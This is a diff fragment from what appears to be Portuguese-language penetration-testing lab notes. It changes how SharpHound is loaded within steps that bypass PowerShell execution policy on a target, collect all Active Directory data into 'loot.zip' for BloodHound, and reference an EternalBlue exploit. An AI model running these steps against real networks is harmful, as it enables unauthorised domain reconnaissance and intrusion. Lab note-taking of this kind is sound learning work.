@@ -2124,7 +2124,7 @@ Nota: exploit-Windows-Eternalblue-win8 RHOST 192.168.1.233
 	bloodhound
  	 -> NO ALVO
    	powershell -ep bypass
-        . .\Downloads\SharpHound.ps1
+        ..\Downloads\SharpHound.ps1
 	Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip 
 	 -> COPIA o arquivo LOOT.ZIP gerado para o BLOODHOUND
 .
